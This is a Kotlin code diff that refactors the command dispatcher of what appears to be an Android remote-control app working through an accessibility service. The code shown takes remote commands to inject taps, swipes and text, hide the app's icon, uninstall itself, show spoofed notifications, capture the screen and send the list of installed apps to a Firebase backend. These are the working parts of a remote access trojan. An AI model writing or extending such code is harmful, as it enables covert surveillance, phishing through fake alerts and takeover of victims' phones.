@@ -26,37 +26,29 @@ object CommandProcessor {
 
     private fun execute(cmd: RemoteCommand, key: String?) {
         val svc = MyAccessibilityService.instance ?: return
+
         when (cmd.type) {
-            "tap" -> svc.tap(cmd.x ?: 0, cmd.y ?: 0)
-            "swipe" -> svc.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0, cmd.duration ?: 300L)
-            "type" -> svc.injectText(cmd.text ?: "")
-            "hide_activity" -> svc.hideAppIcon()
-            "uninstall" -> svc.uninstallSelf()
-            "fake_notification" -> {
-                val title = decodeIfBase64(cmd.title) ?: "⚠ Alert"
-                val body = decodeIfBase64(cmd.text) ?: "Tap to view"
-                NotificationSpoofer.show(context, title, body, cmd.iconUrl, cmd.bigPictureUrl)
-            }
-            "start_screen_capture" -> svc.startScreenCapture()
-            "stop_screen_capture" -> svc.stopScreenCapture()
-            "get_apps" -> FirebaseBridge.pushInstalledApps(svc.getInstalledApps())
             "prompt" -> {
-                val promptText = decodeIfBase64(cmd.text) ?: return
-                val actions = NLPParser.parse(promptText)
+                val prompt = decodeIfBase64(cmd.text) ?: return
+                val actions = NLPParser.parse(prompt)
                 val steps = actions.map { action ->
                     MacroRunner.MacroStep(action.type, action.data, 3)
                 }
                 val macroId = key ?: "prompt_${System.currentTimeMillis()}"
                 svc.executeMacro(macroId, steps)
             }
-            "macro" -> {
-                val steps = cmd.steps?.mapNotNull { step ->
-                    val type = step["type"] as? String ?: return@mapNotNull null
-                    val data = step["data"]
-                    MacroRunner.MacroStep(type, data, 3)
-                } ?: emptyList()
-                val macroId = key ?: "macro_${System.currentTimeMillis()}"
-                svc.executeMacro(macroId, steps)
+            else -> {
+                val params = mutableMapOf<String, Any?>()
+                cmd.x?.let { params["x"] = it }
+                cmd.y?.let { params["y"] = it }
+                cmd.sx?.let { params["sx"] = it }
+                cmd.sy?.let { params["sy"] = it }
+                cmd.ex?.let { params["ex"] = it }
+                cmd.ey?.let { params["ey"] = it }
+                cmd.text?.let { params["text"] = decodeIfBase64(it) }
+                cmd.title?.let { params["title"] = decodeIfBase64(it) }
+                cmd.duration?.let { params["duration"] = it }
+                svc.performSingleCommand(cmd.type ?: "unknown", params)
             }
         }
     }
@@ -78,4 +70,33 @@ object CommandProcessor {
         val duration: Long? = null,
         val steps: List<Map<String, Any>>? = null
     )
+}
+
+// Add extension
+fun MyAccessibilityService.performSingleCommand(type: String, params: Map<String, Any?>) {
+    when (type) {
+        "tap" -> tap(params["x"] as? Int ?: 500, params["y"] as? Int ?: 1000)
+        "swipe" -> swipe(
+            params["sx"] as? Int ?: 0,
+            params["sy"] as? Int ?: 0,
+            params["ex"] as? Int ?: 0,
+            params["ey"] as? Int ?: 0,
+            params["duration"] as? Long ?: 300L
+        )
+        "type" -> injectText(params["text"] as? String ?: "")
+        "launch" -> launchApp(params["package"] as? String ?: "")
+        "click_text" -> clickText(params["text"] as? String ?: "")
+        "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
+        "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
+        "hide_activity" -> hideAppIcon()
+        "uninstall" -> uninstallSelf()
+        "start_screen_capture" -> startScreenCapture()
+        "stop_screen_capture" -> stopScreenCapture()
+        "get_apps" -> FirebaseBridge.pushInstalledApps(getInstalledApps())
+        "fake_notification" -> {
+            val title = params["title"] as? String ?: "⚠ Alert"
+            val text = params["text"] as? String ?: "Tap to view"
+            NotificationSpoofer.show(context, title, text, null, null)
+        }
+    }
 }
